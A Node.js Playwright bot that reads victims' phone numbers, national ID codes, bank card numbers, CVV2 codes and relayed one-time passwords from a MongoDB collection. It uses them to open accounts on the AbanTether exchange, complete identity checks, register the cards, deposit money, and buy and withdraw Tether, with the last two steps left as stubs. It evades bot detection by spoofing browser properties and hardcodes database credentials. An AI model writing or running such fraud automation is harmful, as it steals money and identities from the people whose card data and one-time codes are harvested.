const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI || 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority');
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Map(); // تغییر به Map برای ذخیره اطلاعات بیشتر
        this.screenshotsDir = './screenshots';
        this.password = 'Aban@1404T';
        this.maxRetries = 3;
        this.sessionAttempts = 0;
        this.maxSessionAttempts = 2;
        this.activeSessions = 0;
        this.maxSessions = 1; // فقط یک session همزمان
    }

    async log(step, message) {
        const timestamp = new Date().toISOString();
        const logMessage = `[${timestamp}] [${step}] ${message}`;
        console.log(logMessage);
        await fs.appendFile('bot.log', logMessage + '\n');
    }

    async saveScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const filepath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: filepath });
            this.log('SCREENSHOT', `Saved: ${filepath}`);
        } catch (error) {
            this.log('ERROR', `Screenshot error: ${error.message}`);
        }
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME || 'ZarrinApp');
            this.collection = this.db.collection(process.env.COLLECTION_NAME || 'zarinapp');
            this.log('DATABASE', '✅ Connected to MongoDB');
        } catch (error) {
            this.log('ERROR', `Database connection failed: ${error.message}`);
            throw error;
        }
    }

    async checkDatabase() {
        try {
            this.log('DATABASE', '🔍 Checking for pending users...');
            
            const users = await this.collection.find({
                $and: [
                    { 
                        $or: [
                            { otp_login: { $exists: true, $ne: null, $ne: '' } },
                            { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                            { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                        ]
                    },
                    { processed: { $ne: true } },
                    { personalPhoneNumber: { $ne: "", $exists: true } },
                    { 
                        $or: [
                            { status: { $exists: false } },
                            { status: { $ne: 'failed' } },
                            { 
                                $and: [
                                    { status: 'failed' },
                                    { retryCount: { $lt: this.maxRetries } }
                                ]
                            }
                        ]
                    }
                ]
            }).toArray();

            this.log('DATABASE', `Found ${users.length} users pending processing`);

            for (const user of users) {
                const phone = user.personalPhoneNumber;
                
                if (phone && !this.processingUsers.has(phone) && this.activeSessions < this.maxSessions) {
                    this.log('PROCESSING', `🚀 Starting processing for: ${phone}`);
                    
                    // ذخیره اطلاعات بیشتر در Map
                    this.processingUsers.set(phone, {
                        user,
                        retryCount: user.retryCount || 0,
                        startedAt: new Date(),
                        status: 'starting'
                    });
                    this.activeSessions++;
                    
                    // پردازش غیرهمزمان
                    this.processUser(user).catch(async (error) => {
                        this.log('ERROR', `Failed for ${phone}: ${error.message}`);
                        const userInfo = this.processingUsers.get(phone);
                        if (userInfo) {
                            userInfo.retryCount += 1;
                            await this.handleUserFailure(phone, error.message, userInfo.retryCount);
                        }
                        this.processingUsers.delete(phone);
                        this.activeSessions--;
                    });
                } else if (this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `⏭️ User ${phone} is already being processed`);
                }
            }
        } catch (error) {
            this.log('ERROR', `Database check error: ${error.message}`);
        }
    }

    async handleUserFailure(phone, errorMessage, retryCount) {
        try {
            if (retryCount >= this.maxRetries) {
                await this.collection.updateOne(
                    { personalPhoneNumber: phone },
                    { 
                        $set: {
                            status: 'failed',
                            processed: true,
                            failureReason: `Max retries exceeded: ${errorMessage}`,
                            failedAt: new Date(),
                            retryCount: retryCount
                        }
                    }
                );
                this.log('STATUS', `❌ User ${phone} marked as failed after ${retryCount} attempts`);
            } else {
                await this.collection.updateOne(
                    { personalPhoneNumber: phone },
                    { 
                        $set: {
                            status: 'failed_retryable',
                            failureReason: errorMessage,
                            lastRetry: new Date(),
                            retryCount: retryCount
                        }
                    }
                );
                this.log('STATUS', `⚠️ User ${phone} failed (attempt ${retryCount}/${this.maxRetries})`);
            }
        } catch (error) {
            this.log('ERROR', `Failed to update failure status: ${error.message}`);
        }
    }

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        const userInfo = this.processingUsers.get(phone);
        const retryCount = userInfo?.retryCount || 0;
        
        try {
            this.log('PROCESS', `🔄 Processing user: ${phone} (Attempt: ${retryCount + 1}/${this.maxRetries})`);
            await this.updateUserStatus(phone, 'starting', 'Process started');
            
            // Step 1: Initialize browser
            await this.updateUserStatus(phone, 'initializing_browser', 'Launching browser');
            await this.initializeBrowser();
            
            // Step 2: Enter phone number
            await this.updateUserStatus(phone, 'entering_phone', 'Entering phone number');
            await this.enterPhoneNumber(user);
            
            // Step 3: Wait for and enter OTP
            await this.updateUserStatus(phone, 'waiting_login_otp', 'Waiting for login OTP');
            const loginOTP = await this.waitForField(phone, 'otp_login');
            
            // Step 4: Login with OTP
            await this.updateUserStatus(phone, 'logging_in', 'Logging in with OTP');
            await this.loginWithOTP(user, loginOTP);
            
            // Step 5: Set password
            await this.updateUserStatus(phone, 'setting_password', 'Setting account password');
            await this.setPassword();
            
            // Step 6: Complete KYC
            await this.updateUserStatus(phone, 'completing_kyc', 'Completing KYC information');
            await this.completeKYC(user);
            
            // Step 7: Register bank card
            await this.updateUserStatus(phone, 'adding_card', 'Adding bank card');
            await this.addCard(user);
            
            // Wait for card OTP
            await this.updateUserStatus(phone, 'waiting_card_otp', 'Waiting for card OTP');
            const cardOTP = await this.waitForField(phone, 'otp_register_card');
            
            // Step 8: Complete card registration
            await this.updateUserStatus(phone, 'registering_card', 'Registering card with OTP');
            await this.registerCardWithOTP(cardOTP);
            
            // Step 9: Deposit money
            await this.updateUserStatus(phone, 'initiating_deposit', 'Initiating deposit');
            await this.initiateDeposit();
            
            // Wait for payment OTP
            await this.updateUserStatus(phone, 'waiting_payment_otp', 'Waiting for payment OTP');
            const paymentOTP = await this.waitForField(phone, 'otp_payment');
            
            // Step 10: Complete payment
            await this.updateUserStatus(phone, 'completing_payment', 'Completing payment');
            await this.completePayment(paymentOTP);
            
            // Step 11: Buy Tether
            await this.updateUserStatus(phone, 'buying_tether', 'Buying Tether');
            await this.buyTether();
            
            // Step 12: Withdraw Tether
            await this.updateUserStatus(phone, 'withdrawing_tether', 'Withdrawing Tether');
            await this.withdrawTether();
            
            // Complete
            await this.updateUserStatus(phone, 'completed', 'Process completed successfully');
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `✅ Successfully completed for: ${phone}`);
            
        } catch (error) {
            this.log('ERROR', `❌ Process failed for ${phone}: ${error.message}`);
            throw error;
        } finally {
            this.closeBrowser();
            const userInfo = this.processingUsers.get(phone);
            if (userInfo) {
                this.activeSessions--;
            }
            this.processingUsers.delete(phone);
        }
    }

    async waitForField(phone, fieldName, timeout = 120000) {
        this.log('WAIT', `⏳ Waiting for ${fieldName} for ${phone}...`);
        
        const startTime = Date.now();
        const checkInterval = 3000;
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].toString().trim() !== '') {
                    const value = user[fieldName].toString();
                    this.log('WAIT', `✅ ${fieldName} received: ${value}`);
                    
                    // حذف OTP از دیتابیس
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                const remaining = Math.floor((timeout - (Date.now() - startTime)) / 1000);
                
                if (elapsed % 15 === 0) {
                    this.log('WAIT', `⏳ Waiting ${elapsed}s for ${fieldName}... (${remaining}s remaining)`);
                    await this.saveScreenshot(`waiting-${fieldName}`);
                }
                
                await this.sleep(checkInterval);
                
            } catch (error) {
                this.log('ERROR', `Error checking ${fieldName}: ${error.message}`);
                await this.sleep(checkInterval);
            }
        }
        
        throw new Error(`Timeout: No ${fieldName} received after ${timeout/1000} seconds`);
    }

    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 Initializing browser...');
            
            this.browser = await chromium.launch({
                headless: false, // تغییر به false برای دیباگ
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1280,800',
                    '--disable-blink-features=AutomationControlled'
                ]
            });
            
            const context = await this.browser.newContext({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                viewport: { width: 1280, height: 800 },
                locale: 'fa-IR',
                timezoneId: 'Asia/Tehran'
            });
            
            // مخفی کردن اینکه ربات هستیم
            await context.addInitScript(() => {
                // Webdriver را مخفی کن
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                // Chrome را مخفی کن
                window.chrome = { runtime: {} };
                // notifications را مخفی کن
                const originalQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters.name === 'notifications' ?
                        Promise.resolve({ state: Notification.permission }) :
                        originalQuery(parameters)
                );
                // plugins را مخفی کن
                Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                // languages را مخفی کن
                Object.defineProperty(navigator, 'languages', { get: () => ['fa-IR', 'fa', 'en-US', 'en'] });
            });
            
            this.page = await context.newPage();
            
            // زمان‌بندهای طولانی‌تر
            this.page.setDefaultTimeout(90000);
            this.page.setDefaultNavigationTimeout(90000);
            
            // Disable images for faster loading
            await this.page.route('**/*', route => {
                if (route.request().resourceType() === 'image')
                    route.abort();
                else
                    route.continue();
            });
            
            this.log('BROWSER', '✅ Browser initialized');
            
        } catch (error) {
            this.log('ERROR', `Browser init failed: ${error.message}`);
            throw error;
        }
    }

    async enterPhoneNumber(user) {
        try {
            this.log('PHONE', `📱 Starting registration for: ${user.personalPhoneNumber}`);
            
            // رفتن به صفحه اصلی
            await this.page.goto('https://abantether.com', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.saveScreenshot('01-main-page');
            
            // جستجوی دکمه ثبت‌نام
            const registerSelectors = [
                'a:has-text("ثبت‌نام")',
                'button:has-text("ثبت‌نام")',
                'a[href*="/register"]',
                'button:has-text("Register")',
                'a[href*="register"]'
            ];
            
            let registerFound = false;
            for (const selector of registerSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element && await element.isVisible()) {
                        await element.click();
                        this.log('PHONE', `✅ Clicked register: ${selector}`);
                        registerFound = true;
                        await this.sleep(3000);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            if (!registerFound) {
                // رفتن مستقیم به صفحه ثبت‌نام
                this.log('PHONE', '⚠️ Register button not found, going directly to register page');
                await this.page.goto('https://abantether.com/register', {
                    waitUntil: 'networkidle',
                    timeout: 60000
                });
            }
            
            await this.saveScreenshot('02-register-page');
            
            // چک کردن صفحه و پیدا کردن فیلد موبایل
            const pageContent = await this.page.content();
            if (pageContent.includes('کد تایید') || pageContent.includes('کد فعالسازی')) {
                this.log('PHONE', '✅ Already on OTP page, skipping phone entry');
                return;
            }
            
            // ورود شماره موبایل با روش‌های مختلف
            const phoneEntered = await this.fillPhoneField(user.personalPhoneNumber);
            
            if (!phoneEntered) {
                throw new Error('Could not enter phone number');
            }
            
            await this.saveScreenshot('03-phone-entered');
            
            // کلیک روی دکمه ادامه
            const continueClicked = await this.clickContinueButton();
            
            if (!continueClicked) {
                // تلاش با Enter
                await this.page.keyboard.press('Enter');
                this.log('PHONE', '✅ Pressed Enter');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('04-after-continue');
            
            this.log('PHONE', '✅ Phone submitted successfully');
            
        } catch (error) {
            this.log('ERROR', `Phone entry failed: ${error.message}`);
            await this.saveScreenshot('error-phone-entry');
            throw error;
        }
    }

    async fillPhoneField(phoneNumber) {
        this.log('PHONE', `🔍 Looking for phone field to enter: ${phoneNumber}`);
        
        const phoneSelectors = [
            'input[type="tel"]',
            'input[type="text"][inputmode="numeric"]',
            'input[name*="phone"]',
            'input[name*="mobile"]',
            'input[placeholder*="موبایل"]',
            'input[placeholder*="شماره همراه"]',
            'input[placeholder*="تلفن همراه"]',
            'input[id*="phone"]',
            'input[id*="mobile"]',
            'input[autocomplete="tel"]'
        ];
        
        for (const selector of phoneSelectors) {
            try {
                const input = await this.page.$(selector);
                if (input && await input.isVisible()) {
                    await input.fill('');
                    await this.sleep(500);
                    await input.fill(phoneNumber);
                    await this.sleep(1000);
                    
                    const enteredValue = await input.inputValue();
                    if (enteredValue.includes(phoneNumber) || enteredValue.includes(phoneNumber.substring(1))) {
                        this.log('PHONE', `✅ Phone entered via selector: ${selector}`);
                        return true;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // تلاش دوم: بررسی تمام inputها
        const allInputs = await this.page.$$('input');
        this.log('PHONE', `🔍 Found ${allInputs.length} total input fields`);
        
        for (let i = 0; i < allInputs.length; i++) {
            try {
                const input = allInputs[i];
                if (await input.isVisible()) {
                    const placeholder = await input.getAttribute('placeholder') || '';
                    const name = await input.getAttribute('name') || '';
                    const id = await input.getAttribute('id') || '';
                    const type = await input.getAttribute('type') || '';
                    
                    const isPhoneField = placeholder.includes('موبایل') || 
                                        placeholder.includes('شماره') || 
                                        placeholder.includes('تلفن') ||
                                        name.includes('phone') ||
                                        name.includes('mobile') ||
                                        id.includes('phone') ||
                                        id.includes('mobile') ||
                                        type === 'tel';
                    
                    if (isPhoneField) {
                        await input.fill('');
                        await this.sleep(300);
                        await input.fill(phoneNumber);
                        await this.sleep(1000);
                        
                        const enteredValue = await input.inputValue();
                        this.log('PHONE', `✅ Phone entered in field ${i}: ${enteredValue}`);
                        return true;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        return false;
    }

    async clickContinueButton() {
        this.log('BUTTON', '🔍 Looking for continue button...');
        
        const buttonTexts = ['ادامه', 'مرحله بعد', 'بعدی', 'ارسال', 'تایید', 'ورود', 'ارسال کد'];
        const buttonSelectors = [
            'button',
            'button[type="submit"]',
            'a[role="button"]',
            'div[role="button"]',
            '[class*="button"]',
            '[class*="btn"]'
        ];
        
        // اول با متن جستجو کن
        for (const text of buttonTexts) {
            try {
                const xpath = `//*[text()="${text}" or contains(text(), "${text}")]`;
                const elements = await this.page.$$(xpath);
                
                for (const element of elements) {
                    try {
                        if (await element.isVisible() && await element.isEnabled()) {
                            await element.click();
                            this.log('BUTTON', `✅ Clicked button with text: "${text}"`);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // سپس با سلکتورها
        for (const selector of buttonSelectors) {
            try {
                const elements = await this.page.$$(selector);
                for (const element of elements) {
                    try {
                        if (await element.isVisible() && await element.isEnabled()) {
                            const text = await element.textContent();
                            if (text && text.trim()) {
                                await element.click();
                                this.log('BUTTON', `✅ Clicked button with selector: ${selector}`);
                                return true;
                            }
                        }
                    } catch (error) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        this.log('BUTTON', '❌ No suitable button found');
        return false;
    }

    async loginWithOTP(user, otp) {
        try {
            this.log('LOGIN', `🔑 Entering OTP: ${otp}`);
            
            await this.sleep(3000);
            await this.saveScreenshot('05-waiting-otp-input');
            
            // پیدا کردن فیلد OTP
            const otpEntered = await this.fillOTPField(otp);
            
            if (!otpEntered) {
                throw new Error('Could not enter OTP');
            }
            
            await this.saveScreenshot('06-otp-entered');
            
            // کلیک روی دکمه تأیید
            const verifyClicked = await this.clickVerifyButton();
            
            if (!verifyClicked) {
                // تلاش با Enter
                await this.page.keyboard.press('Enter');
                this.log('LOGIN', '✅ Pressed Enter');
            }
            
            await this.sleep(8000);
            await this.saveScreenshot('07-after-login');
            
            this.log('LOGIN', '✅ Login completed');
            
        } catch (error) {
            this.log('ERROR', `Login failed: ${error.message}`);
            await this.saveScreenshot('error-login');
            throw error;
        }
    }

    async fillOTPField(otp) {
        this.log('OTP', `🔍 Looking for OTP field for: ${otp}`);
        
        if (!otp || otp.length < 4) {
            throw new Error('Invalid OTP format');
        }
        
        // روش اول: فیلدهای جداگانه OTP
        const otpDigitSelectors = [
            'input[type="number"]',
            'input[type="tel"][maxlength="1"]',
            'input[maxlength="1"]',
            'input[style*="width"][style*="height"]',
            'div[class*="otp"] input',
            'div[class*="code"] input'
        ];
        
        for (const selector of otpDigitSelectors) {
            try {
                const inputs = await this.page.$$(selector);
                if (inputs.length >= 4) {
                    this.log('OTP', `✅ Found ${inputs.length} OTP digit fields`);
                    
                    for (let i = 0; i < Math.min(inputs.length, otp.length); i++) {
                        if (await inputs[i].isVisible()) {
                            await inputs[i].fill(otp[i]);
                            await this.sleep(200);
                        }
                    }
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        // روش دوم: فیلد تک OTP
        const singleOtpSelectors = [
            'input[type="tel"][maxlength="6"]',
            'input[type="number"][maxlength="6"]',
            'input[name*="otp"]',
            'input[name*="code"]',
            'input[placeholder*="کد"]',
            'input[placeholder*="رمز"]'
        ];
        
        for (const selector of singleOtpSelectors) {
            try {
                const input = await this.page.$(selector);
                if (input && await input.isVisible()) {
                    await input.fill(otp);
                    this.log('OTP', `✅ OTP entered in single field: ${selector}`);
                    return true;
                }
            } catch (error) {
                continue;
            }
        }
        
        return false;
    }

    async clickVerifyButton() {
        this.log('BUTTON', '🔍 Looking for verify button...');
        
        const verifyTexts = ['تأیید', 'تایید', 'ورود', 'ثبت', 'Verify', 'Confirm'];
        
        for (const text of verifyTexts) {
            try {
                const selector = `:has-text("${text}")`;
                const elements = await this.page.$$(selector);
                
                for (const element of elements) {
                    try {
                        if (await element.isVisible() && await element.isEnabled()) {
                            await element.click();
                            this.log('BUTTON', `✅ Clicked verify button: "${text}"`);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        return false;
    }

    async setPassword() {
        try {
            this.log('PASSWORD', '🔐 Setting password...');
            
            await this.sleep(5000);
            await this.saveScreenshot('08-checking-password');
            
            const pageContent = await this.page.content();
            
            if (pageContent.includes('رمز عبور') || pageContent.includes('گذرواژه')) {
                this.log('PASSWORD', '✅ On password page');
                
                // پیدا کردن فیلدهای رمز عبور
                const passwordInputs = await this.page.$$('input[type="password"]');
                
                if (passwordInputs.length >= 2) {
                    // رمز عبور
                    await passwordInputs[0].fill(this.password);
                    this.log('PASSWORD', `✅ Password set: ${this.password}`);
                    
                    // تأیید رمز عبور
                    await passwordInputs[1].fill(this.password);
                    this.log('PASSWORD', '✅ Confirm password entered');
                    
                    // کلیک روی دکمه تکمیل
                    await this.clickCompleteButton();
                    
                    await this.sleep(5000);
                    await this.saveScreenshot('09-password-set');
                    
                } else {
                    this.log('PASSWORD', '⚠️ Not enough password fields found');
                }
            } else {
                this.log('PASSWORD', '⚠️ Not on password page, may have skipped');
            }
            
        } catch (error) {
            this.log('ERROR', `Password setting failed: ${error.message}`);
            await this.saveScreenshot('error-password');
            throw error;
        }
    }

    async clickCompleteButton() {
        const completeTexts = ['تکمیل ثبت‌نام', 'تکمیل', 'ادامه', 'ثبت'];
        
        for (const text of completeTexts) {
            try {
                const selector = `:has-text("${text}")`;
                const elements = await this.page.$$(selector);
                
                for (const element of elements) {
                    try {
                        if (await element.isVisible() && await element.isEnabled()) {
                            await element.click();
                            this.log('BUTTON', `✅ Clicked complete button: "${text}"`);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        
        // fallback
        await this.page.keyboard.press('Enter');
        this.log('BUTTON', '✅ Pressed Enter');
        return true;
    }

    async completeKYC(user) {
        try {
            this.log('KYC', '📋 Completing KYC...');
            
            await this.sleep(5000);
            await this.saveScreenshot('10-checking-kyc');
            
            // پر کردن اطلاعات
            const kycFields = [
                { name: 'personalName', label: 'نام', value: user.personalName },
                { name: 'personalNationalCode', label: 'کد ملی', value: user.personalNationalCode },
                { name: 'personalBirthDate', label: 'تاریخ تولد', value: user.personalBirthDate },
                { name: 'personalCity', label: 'شهر', value: user.personalCity },
                { name: 'personalProvince', label: 'استان', value: user.personalProvince }
            ];
            
            let filledCount = 0;
            for (const field of kycFields) {
                if (field.value) {
                    const filled = await this.fillFormField(field.label, field.value);
                    if (filled) filledCount++;
                    await this.sleep(1000);
                }
            }
            
            this.log('KYC', `✅ Filled ${filledCount} KYC fields`);
            
            if (filledCount > 0) {
                await this.saveScreenshot('11-kyc-filled');
                
                // تأیید اطلاعات
                await this.clickVerifyButton();
                
                await this.sleep(5000);
                await this.saveScreenshot('12-kyc-completed');
            }
            
        } catch (error) {
            this.log('ERROR', `KYC failed: ${error.message}`);
            await this.saveScreenshot('error-kyc');
            throw error;
        }
    }

    async fillFormField(label, value) {
        try {
            // جستجو با placeholder
            const placeholderInput = await this.page.$(`input[placeholder*="${label}"]`);
            if (placeholderInput && await placeholderInput.isVisible()) {
                await placeholderInput.fill(value);
                this.log('FORM', `✅ ${label}: ${value} (via placeholder)`);
                return true;
            }
            
            // جستجو با label
            const xpath = `//label[contains(text(), "${label}")]/following::input[1]`;
            const labelInput = await this.page.$(xpath);
            if (labelInput && await labelInput.isVisible()) {
                await labelInput.fill(value);
                this.log('FORM', `✅ ${label}: ${value} (via label)`);
                return true;
            }
            
            return false;
        } catch (error) {
            this.log('ERROR', `Failed to fill ${label}: ${error.message}`);
            return false;
        }
    }

    async addCard(user) {
        try {
            this.log('CARD', '💳 Adding bank card...');
            
            // رفتن به کیف پول
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.saveScreenshot('13-wallet-page');
            
            // پیدا کردن بخش کارت‌ها
            const cardSectionSelectors = [
                'a:has-text("کارت‌های من")',
                'button:has-text("کارت‌های من")',
                'a:has-text("اطلاعات بانکی")',
                ':has-text("افزودن کارت")'
            ];
            
            for (const selector of cardSectionSelectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element && await element.isVisible()) {
                        await element.click();
                        this.log('CARD', `✅ Clicked: ${selector}`);
                        await this.sleep(3000);
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            await this.saveScreenshot('14-card-section');
            
            // افزودن کارت جدید
            const addCardButton = await this.page.$('button:has-text("افزودن کارت جدید")');
            if (addCardButton && await addCardButton.isVisible()) {
                await addCardButton.click();
                this.log('CARD', '✅ Clicked add new card');
                await this.sleep(2000);
            }
            
            await this.saveScreenshot('15-add-card-form');
            
            // پر کردن اطلاعات کارت
            const cardFields = [
                { label: 'شماره کارت', value: user.cardNumber },
                { label: 'CVV2', value: user.cvv2 },
                { label: 'ماه', value: user.bankMonth?.toString() },
                { label: 'سال', value: user.bankYear?.toString() }
            ];
            
            for (const field of cardFields) {
                if (field.value) {
                    await this.fillFormField(field.label, field.value);
                    await this.sleep(1000);
                }
            }
            
            await this.saveScreenshot('16-card-filled');
            
            // ثبت کارت
            const registerButton = await this.page.$('button:has-text("ثبت کارت")');
            if (registerButton && await registerButton.isVisible()) {
                await registerButton.click();
                this.log('CARD', '✅ Card registration submitted');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('17-card-submitted');
            
        } catch (error) {
            this.log('ERROR', `Add card failed: ${error.message}`);
            await this.saveScreenshot('error-add-card');
            throw error;
        }
    }

    async registerCardWithOTP(otp) {
        try {
            this.log('CARD_OTP', `🔐 Completing card registration with OTP: ${otp}`);
            
            await this.fillOTPField(otp);
            await this.saveScreenshot('18-card-otp-entered');
            
            await this.clickVerifyButton();
            
            await this.sleep(5000);
            await this.saveScreenshot('19-card-registered');
            
        } catch (error) {
            this.log('ERROR', `Card OTP failed: ${error.message}`);
            await this.saveScreenshot('error-card-otp');
            throw error;
        }
    }

    async initiateDeposit() {
        try {
            this.log('DEPOSIT', '💰 Initiating deposit...');
            
            // رفتن به کیف پول
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.saveScreenshot('20-wallet-for-deposit');
            
            // کلیک واریز تومان
            const depositButton = await this.page.$(':has-text("واریز تومان")');
            if (depositButton && await depositButton.isVisible()) {
                await depositButton.click();
                this.log('DEPOSIT', '✅ Clicked واریز تومان');
                await this.sleep(3000);
            }
            
            await this.saveScreenshot('21-deposit-page');
            
            // انتخاب واریز آنلاین
            const onlineDeposit = await this.page.$(':has-text("واریز آنلاین")');
            if (onlineDeposit && await onlineDeposit.isVisible()) {
                await onlineDeposit.click();
                this.log('DEPOSIT', '✅ Selected online deposit');
                await this.sleep(2000);
            }
            
            // وارد کردن مبلغ
            const amountInput = await this.page.$('input[placeholder*="مبلغ"]');
            if (amountInput && await amountInput.isVisible()) {
                await amountInput.fill('5000000');
                this.log('DEPOSIT', '✅ Amount entered: 5,000,000 تومان');
            }
            
            await this.saveScreenshot('22-amount-entered');
            
            // پرداخت
            const payButton = await this.page.$('button:has-text("پرداخت")');
            if (payButton && await payButton.isVisible()) {
                await payButton.click();
                this.log('DEPOSIT', '✅ Payment initiated');
            }
            
            await this.sleep(5000);
            await this.saveScreenshot('23-deposit-initiated');
            
        } catch (error) {
            this.log('ERROR', `Deposit failed: ${error.message}`);
            await this.saveScreenshot('error-deposit');
            throw error;
        }
    }

    async completePayment(otp) {
        try {
            this.log('PAYMENT', `💳 Completing payment with OTP: ${otp}`);
            
            await this.fillOTPField(otp);
            await this.saveScreenshot('24-payment-otp');
            
            await this.clickVerifyButton();
            
            await this.sleep(5000);
            await this.saveScreenshot('25-payment-completed');
            
        } catch (error) {
            this.log('ERROR', `Payment completion failed: ${error.message}`);
            await this.saveScreenshot('error-payment');
            throw error;
        }
    }

    async buyTether() {
        try {
            this.log('BUY', '🛒 Buying Tether...');
            
            // رفتن به بازار
            await this.page.goto('https://abantether.com/market', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.saveScreenshot('26-market');
            
            // اینجا منطق خرید را اضافه کنید
            this.log('BUY', '✅ Would buy Tether here');
            
            await this.sleep(3000);
            await this.saveScreenshot('27-buy-tether');
            
        } catch (error) {
            this.log('ERROR', `Buy Tether failed: ${error.message}`);
            await this.saveScreenshot('error-buy');
            throw error;
        }
    }

    async withdrawTether() {
        try {
            this.log('WITHDRAW', '🏦 Withdrawing Tether...');
            
            // رفتن به کیف پول
            await this.page.goto('https://abantether.com/wallet', {
                waitUntil: 'networkidle',
                timeout: 60000
            });
            
            await this.saveScreenshot('28-wallet-for-withdraw');
            
            // اینجا منطق برداشت را اضافه کنید
            this.log('WITHDRAW', '✅ Would withdraw Tether to external wallet');
            
            await this.sleep(3000);
            await this.saveScreenshot('29-withdraw-completed');
            
        } catch (error) {
            this.log('ERROR', `Withdraw failed: ${error.message}`);
            await this.saveScreenshot('error-withdraw');
            throw error;
        }
    }

    async updateUserStatus(phone, status, message) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: {
                        status: status,
                        statusMessage: message,
                        lastUpdated: new Date()
                    }
                }
            );
            
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
            
        } catch (error) {
            this.log('ERROR', `Status update failed: ${error.message}`);
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date()
                    }
                }
            );
            
            this.log('COMPLETE', `✅ ${phone} marked as completed`);
            
        } catch (error) {
            this.log('ERROR', `Mark as completed failed: ${error.message}`);
        }
    }

    async closeBrowser() {
        try {
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
                this.log('BROWSER', '✅ Browser closed');
            }
        } catch (error) {
            this.log('ERROR', `Browser close failed: ${error.message}`);
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        this.log('POLLING', '🔄 Starting database polling (every 30 seconds)');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `Polling error: ${error.message}`);
            }
        }, 30000);
        
        // سرور سلامت
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                timestamp: new Date().toISOString(),
                processing: Array.from(this.processingUsers.keys()),
                activeSessions: this.activeSessions,
                maxSessions: this.maxSessions,
                uptime: process.uptime()
            }));
        });
        
        server.listen(process.env.PORT || 8080, () => {
            this.log('SERVER', `🌐 Health check server running on port ${process.env.PORT || 8080}`);
        });
    }

    async start() {
        this.log('START', '🤖 AbanTether Bot Starting...');
        this.log('CONFIG', `Max retries: ${this.maxRetries}`);
        this.log('CONFIG', `Max sessions: ${this.maxSessions}`);
        this.log('CONFIG', `Password: ${this.password}`);
        
        try {
            await this.connectToMongoDB();
            await this.startPolling();
        } catch (error) {
            this.log('ERROR', `Start failed: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start();

// هندل خطاها
process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});